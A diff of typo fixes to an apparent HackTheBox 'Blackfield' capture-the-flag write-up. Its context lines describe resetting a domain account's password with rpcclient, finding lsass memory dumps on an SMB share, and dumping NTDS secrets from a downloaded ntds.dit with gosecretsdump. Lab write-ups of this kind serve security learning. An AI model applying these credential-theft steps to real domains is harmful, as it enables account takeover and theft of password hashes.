@@ -644,7 +644,7 @@ SeTimeZonePrivilege             0:34 (0x0:0x22)
 SeCreateSymbolicLinkPrivilege           0:35 (0x0:0x23)
 SeDelegateSessionUserImpersonatePrivilege               0:36 (0x0:0x24)
 ````
-This seems like a lot of privileges given to this account, in particular some ones that catch my eye are "SeTrustedCredManAccessPrivilege" and "SeAuditPrivilege". As this accuont is named support it would be understandable for it to have some increased control over other accounts in the domain. Using RPC client, it might be possible to reset or change the password of a domain account to get access to that account.
+This seems like a lot of privileges given to this account, in particular some ones that catch my eye are "SeTrustedCredManAccessPrivilege" and "SeAuditPrivilege". As this account is named support it would be understandable for it to have some increased control over other accounts in the domain. Using RPCclient, it might be possible to reset or change the password of a domain account to get access to that account.
 
 ### 5. Access another account
 Reference: https://malicious.link/post/2017/reset-ad-user-password-with-linux/  
@@ -683,7 +683,7 @@ smb: \> ls
 
                 7846143 blocks of size 4096. 4002829 blocks available
 ```
-Checking out the memory_analysis folder, there is what appears to be some process dumps in zip files. In particular there are a few sensitive ones known to contain user credentials such as lsass.
+Checking out the memory_analysis folder, there is what appears to be some process memory dumps in zip files. In particular there are a few sensitive ones known to contain user credentials such as lsass.
 ```bash
 smb: \> cd memory_analysis
 smb: \memory_analysis\> ls
@@ -991,7 +991,7 @@ Info: Downloading C:\Users\svc_backup\Links\jib1337\ntds.dit to ntds.dit
                                                              
 Info: Download successful!
 ```
-Now dump the NDTS secrets.
+Now dump the NTDS secrets.
 ```bash
 kali@kali:~/Desktop/htb/blackfield$ gosecretsdump -system system.bak -ntds ntds.dit > ntdsdump.txt
 kali@kali:~/Desktop/htb/blackfield$ cat ntdsdump.txt
